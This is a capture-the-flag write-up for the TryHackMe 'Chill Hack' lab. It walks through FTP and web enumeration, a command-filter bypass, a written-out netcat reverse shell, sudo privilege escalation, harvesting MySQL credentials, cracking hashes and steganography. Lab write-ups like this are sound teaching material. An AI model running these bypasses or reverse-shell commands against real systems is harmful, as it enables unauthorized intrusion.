---
created: 22-01-2026
---
- Challenge: [`Chill Hack`](https://tryhackme.com/room/chillhack)
- Difficulty: Easy

## Initial access

- The first step is port scanning:

```bash
sudo nmap 10.66.143.188
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 09:04 UTC
Nmap scan report for 10.66.143.188
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds
```

- Three ports are open: `21` (FTP), `22` (SSH), and `80` (HTTP).
- Check for anonymous FTP access:

```bash
nmap --script ftp-anon 10.66.143.188 -p21
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 09:05 UTC
Nmap scan report for 10.66.143.188
Host is up (0.30s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt

Nmap done: 1 IP address (1 host up) scanned in 1.97 seconds
```

- Anonymous FTP login allowed. So log in:

```bash
ftp anonymous@10.66.143.188
```

```bash
Connected to 10.66.143.188.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

- List files:

```bash
ftp> ls -la
```

```bash
229 Entering Extended Passive Mode (|||27503|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
```

- Get the available file:

```bash
ftp> get note.txt
```

```bash
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||61814|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |**********************************************************|    90        0.91 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.19 KiB/s)
ftp> 
```

- Inspect the obtained text file:

```bash
cat note.txt
```

```bash
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

Not clear how to apply this now. 

- Move on the web server:

![[website.png]]

Some CSS-bloated web application.

- From one of the errors we get that this is Apache/2.4.41 running on Ubuntu. 

- Let's enumerate directories:

```bash
ffuf -w ./Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.66.143.188/FUZZ -c -ic -s
```

```
images
css
js
fonts
secret
```


- There's a `secret` file found:

![[execute.png]]


- It seems it is simply a command execution interface:

![[id.png]]

Even animated. Thanks!

- But when you try to establish a reverse shell, well, this appears:


![[filtering.png]]

I hope, at least trying to become one.


- It's a good idea to discover what and how is blocked:

```bash
bash   # does not work
ba's'h # works

ls   # does not work
l's' # works

cat   # does not work
c'a't # works
c\at  # works
```

So we have two bypasses so far: quotes and slashes. Let's give another try to a reverse shell:

```bash
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.148.230 1337  >/tmp/f
```

```bash
 nc -lvnp 1337                                                                             
listening on [any] 1337 ...
connect to [192.168.148.230] from (UNKNOWN) [10.66.143.188] 52196
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Gotcha!

- Get a normal interactive shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
^Z
```

```bash
stty raw -echo && fg
```

- Let's start enumeration.

## Privilege escalation

```bash
sudo -l
```

```bash
Matching Defaults entries for www-data on ip-10-66-143-188:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-66-143-188:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

Oh, really, I knew there was something about that script (I found it when trying to escape filtering in the command execution interface).sudo

```bash
cat /home/apaar/.helpline.sh
```

```bash
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
www-data@ip-10-66-143-188:/var/www/html/secret$ 
```

This script is apparently vulnerable. Look at this line:

```bash
$msg 2>/dev/null
```

This executes **whatever the user typed** as a shell command.


```bash
 sudo -u apaar /home/apaar/.helpline.sh
```

```bash
Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: anyone
Hello user! I am anyone,  Please enter your message: /bin/bash
whoami
apaar
```


- Get a normal shell again:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

- Get the flag:

```bash
cd 
```

```bash
ls
```

```bash
local.txt
```

```bash
cat local.txt
```

```bash
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

>[!note] For a more robust shell, I added my public SSH key to the `apaar`'s `.ssh/authorized_keys` and connected.

## Root privilege escalation

- During enumeration, I stumbled upon the `/var/www/files` directory:

```bash
ls -la /var/www
```

```bash
total 16
drwxr-xr-x  4 root root 4096 Oct  3  2020 .
drwxr-xr-x 14 root root 4096 Oct  3  2020 ..
drwxr-xr-x  3 root root 4096 Oct  3  2020 files
drwxr-xr-x  8 root root 4096 Oct  3  2020 html
```

```bash
ls -R /var/www/files
```

```bash
/var/www/files:
account.php  hacker.php  images  index.php  style.css

/var/www/files/images:
002d7e638fb463fb7a266f5ffc7ac47d.gif  hacker-with-laptop_23-2147985341.jpg
```

```bash
cat /var/www/files/index.php
```

```HTML
<html>
<body>
<?php
	if(isset($_POST['submit']))
	{
		$username = $_POST['username'];
		$password = $_POST['password'];
		ob_start();
		session_start();
		try
		{
			$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
			$con->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
		}
		catch(PDOException $e)
		{
			exit("Connection failed ". $e->getMessage());
		}
		require_once("account.php");
		$account = new Account($con);
		$success = $account->login($username,$password);
		if($success)
		{
			header("Location: hacker.php");
		}
	}
?>
<link rel="stylesheet" type="text/css" href="style.css">
	<div class="signInContainer">
		<div class="column">
			<div class="header">
				<h2 style="color:blue;">Customer Portal</h2>
				<h3 style="color:green;">Log In<h3>
			</div>
			<form method="POST">
				<?php echo $success?>
                		<input type="text" name="username" id="username" placeholder="Username" required>
				<input type="password" name="password" id="password" placeholder="Password" required>
				<input type="submit" name="submit" value="Submit">
        		</form>
		</div>
	</div>
</body>
</html>
```

- Credentials to MySQL!

```bash
username: root
password: !@m+her00+@db
```


- Connect to MySQL:

```bash
mysql -u root -p
```

```bash
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

```SQL
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.01 sec)
```

```SQL
mysql> use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```SQL
mysql> show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.01 sec)
```

```SQL
mysql> select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

Judging by hash size, this is MD5. Easy to crack: `7e53614ced3640d5de23f111806cc4fd` is `masterpassword`. Yes this password doesn't work for the `anurodh` user on the system.

- Check another file in `/var/www/files`:

```bash
cat /var/www/files/hacker.php
```

```bash
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
	color:red;
	font-weight: bold;
}
h1
{
	color: yellow;
	font-weight: bold;
}
</style>
<center>
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

~~What the hell that "dark" is supposed to mean...~~

```bash
cp /var/www/files/images/hacker-with-laptop_23-2147985341.jpg /home/apaar/
```

- On your machine:

```bash
scp -i id_rsa apaar@10.66.147.244:/home/apaar/hacker-with-laptop_23-2147985341.jpg ./
```

```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase: 
wrote extracted data to "backup.zip".
```

```bash
zip2john backup.zip | tee hash
```